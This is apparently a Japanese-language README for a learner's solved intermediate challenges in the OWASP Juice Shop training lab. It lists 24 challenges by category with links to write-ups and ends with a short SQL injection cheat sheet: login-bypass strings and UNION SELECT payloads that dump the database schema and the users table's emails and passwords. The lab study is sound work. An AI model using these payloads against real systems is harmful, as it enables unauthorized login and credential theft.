# 難易度3 チャレンジ (24/24 解決)

中級レベル: SQLインジェクションの応用、XXE、HTTP Parameter Pollution などを学びます。

## 進捗

| 状態 | 数 |
|------|-----|
| ✅ 解決済み | 24 |
| ❌ 未解決 | 0 |

## チャレンジ一覧

| チャレンジ | カテゴリ | 状態 | ファイル |
|-----------|---------|------|----------|
| Login Jim | SQLi | ✅ | [login-jim.md](login-jim.md) |
| Login Bender | SQLi | ✅ | [login-bender.md](login-bender.md) |
| Admin Registration | アクセス制御 | ✅ | [admin-registration.md](admin-registration.md) |
| Forged Feedback | IDOR | ✅ | [forged-feedback.md](forged-feedback.md) |
| Product Tampering | アクセス制御 | ✅ | [product-tampering.md](product-tampering.md) |
| XXE Data Access | XXE | ✅ | [xxe-data-access.md](xxe-data-access.md) |
| Manipulate Basket | HPP | ✅ | [manipulate-basket.md](manipulate-basket.md) |
| Bjoern's Favorite Pet | OSINT | ✅ | [bjoerns-favorite-pet.md](bjoerns-favorite-pet.md) |
| Database Schema | SQLi | ✅ | [database-schema.md](database-schema.md) |
| CAPTCHA Bypass | 自動化 | ✅ | [captcha-bypass.md](captcha-bypass.md) |
| Forged Review | IDOR | ✅ | [forged-review.md](forged-review.md) |
| GDPR Data Erasure | 認証 | ✅ | [gdpr-data-erasure.md](gdpr-data-erasure.md) |
| Payback Time | 入力検証 | ✅ | [payback-time.md](payback-time.md) |
| API-only XSS | XSS | ✅ | [api-only-xss.md](api-only-xss.md) |
| Login Amy | 認証 | ✅ | [login-amy.md](login-amy.md) |
| Reset Jim's Password | OSINT | ✅ | [reset-jims-password.md](reset-jims-password.md) |
| Upload Size | 入力検証 | ✅ | [upload-size.md](upload-size.md) |
| Upload Type | 入力検証 | ✅ | [upload-type.md](upload-type.md) |
| Security Advisory | 情報漏洩 | ✅ | [security-advisory.md](security-advisory.md) |
| Deluxe Fraud | 入力検証 | ✅ | [deluxe-fraud.md](deluxe-fraud.md) |
| Privacy Policy Inspection | 隠蔽 | ✅ | - |
| Ghost Login | SQLi | ✅ | [ghost-login.md](ghost-login.md) |
| CSRF | アクセス制御 | ✅ | [csrf.md](csrf.md) |
| Mint the Honey Pot | Web3 | ✅ | [mint-the-honey-pot.md](mint-the-honey-pot.md) |

## SQLi リファレンス

```sql
' OR 1=1--                      -- 管理者ログイン
jim@juice-sh.op'--              -- 特定ユーザー
' or deletedAt IS NOT NULL--    -- 削除済みアカウント
')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--
')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM users--
```

## 環境依存チャレンジ

| チャレンジ | 必要条件 |
|-----------|---------|
| CSRF | SameSite Cookie 無効化 (古いブラウザ) |
| Mint the Honey Pot | MetaMask + Sepolia テストネット |
